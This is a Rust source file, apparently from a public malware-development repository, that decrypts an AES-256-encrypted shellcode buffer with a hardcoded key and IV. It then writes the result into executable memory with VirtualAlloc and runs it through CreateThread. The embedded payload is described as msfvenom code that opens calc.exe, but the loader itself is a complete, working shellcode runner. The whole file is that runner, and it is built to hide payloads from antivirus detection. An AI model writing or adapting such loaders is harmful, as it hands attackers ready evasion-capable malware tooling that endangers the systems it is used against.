
/*
    Decrypt AES Encryption Shellcode and Executing it !
    Used Crates: libaes , winapi
    For More Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
    @5mukx
*/

use std::ptr::null_mut;
use libaes::Cipher;
use winapi::um::{
    errhandlingapi::GetLastError, 
    handleapi::CloseHandle, 
    memoryapi::VirtualAlloc, 
    processthreadsapi::{
        CreateThread, ResumeThread}, 
        synchapi::WaitForSingleObject, 
};


// declaring macros !!
macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\____[+] {}", format!($msg, $($arg), *));
    }
}

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\____[-] {}", format!($msg, $($arg), *));
        println!("Exiting...");
        std::process::exit(0);
    }
}

fn main(){
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    // Paste your AES Encrypyed Shellcode
    // Payload Encryption Code is on the Same Repository ...!

    let buf: [u8; 288] = [201, 88, 188, 89, 7, 92, 90, 84, 187, 43, 238, 29, 246, 56, 77, 137, 90, 156, 199, 194, 222, 169, 98, 181, 75, 149, 148, 227, 
    68, 231, 211, 145, 124, 206, 23, 7, 226, 36, 27, 225, 229, 78, 249, 155, 155, 61, 233, 10, 55, 96, 172, 251, 108, 211, 29, 56, 166, 83, 32, 9, 25, 
    157, 14, 169, 139, 149, 194, 177, 168, 219, 179, 117, 134, 18, 225, 152, 128, 76, 13, 145, 86, 213, 222, 255, 234, 199, 97, 128, 118, 158, 171, 202,
    33, 37, 89, 153, 51, 109, 234, 85, 233, 191, 241, 167, 108, 17, 104, 51, 101, 222, 243, 5, 25, 70, 193, 171, 201, 10, 212, 50, 77, 56, 124, 164, 98, 
    107, 49, 248, 180, 5, 168, 23, 221, 92, 78, 97, 220, 18, 142, 87, 238, 65, 132, 82, 82, 217, 147, 226, 226, 133, 24, 9, 20, 199, 25, 119, 77, 41, 152, 158, 189, 171, 107, 106, 242, 17, 25, 75, 235, 247, 120, 90, 207, 203, 117, 125, 7, 165, 255, 243, 244, 7, 171, 241, 51, 236, 4, 214, 74, 125, 0, 
    57, 7, 217, 132, 217, 16, 164, 54, 139, 99, 8, 35, 86, 197, 177, 143, 160, 140, 100, 17, 113, 230, 176, 8, 28, 14, 253, 73, 188, 43, 135, 56, 206, 
    26, 222, 129, 96, 187, 3, 99, 145, 8, 241, 241, 49, 53, 245, 126, 231, 12, 181, 144, 228, 3, 4, 253, 76, 9, 235, 255, 126, 119, 85, 75, 55, 37, 19, 
    42, 9, 94, 229, 73, 127, 105, 173, 78, 64, 134, 195, 214, 226, 208, 120, 14, 254, 127, 241, 9, 214, 222, 239, 156, 73, 67, 148, 209, 214];
    
    // PASTE RAW KEYS KEYS 
    let key: [u8; 32] = [250, 210, 17, 98, 103, 204, 103, 213, 37, 77, 174, 212, 56, 103, 47, 181, 245, 129, 222, 78, 229, 33, 166, 222, 236, 111, 56, 37, 25, 241, 251, 59];
    // PASTE RAW Initialization Vector (iv)
    let iv: [u8; 16] = [36, 32, 35, 81, 237, 38, 143, 85, 219, 233, 159, 76, 65, 127, 206, 203];


    let cipher = Cipher::new_256(&key);
    let buf = cipher.cbc_decrypt(&iv, &buf);
    
    unsafe{
        let address = VirtualAlloc(
            null_mut(),
            buf.len(),
            0x1000 | 0x2000 , // MEM_COMMIT  | MEM_RESERVE
            0x40,
        );

        if address.is_null(){
            error!("Failed to Allocate Memory: {}",GetLastError());
        }

        okey!("VirtualAlloc: {:?}",address);

        std::ptr::copy(buf.as_ptr(), address as *mut u8, buf.len());

        let hthread = CreateThread(
            null_mut(),
            0,
            std::mem::transmute(address),
            null_mut(),
            0x00000004, // CREATE_SUSPEND
            null_mut(),
        );

        if hthread.is_null(){
            error!("Failed to create Thread :{:?}",GetLastError());
        }
        okey!("Thread Addr: {:?}",hthread);
        
        ResumeThread(hthread);
        okey!("Executed Shellcode ...{}","!");

        WaitForSingleObject(hthread, 0xFFFFFFFF);
        CloseHandle(hthread);

    }
}
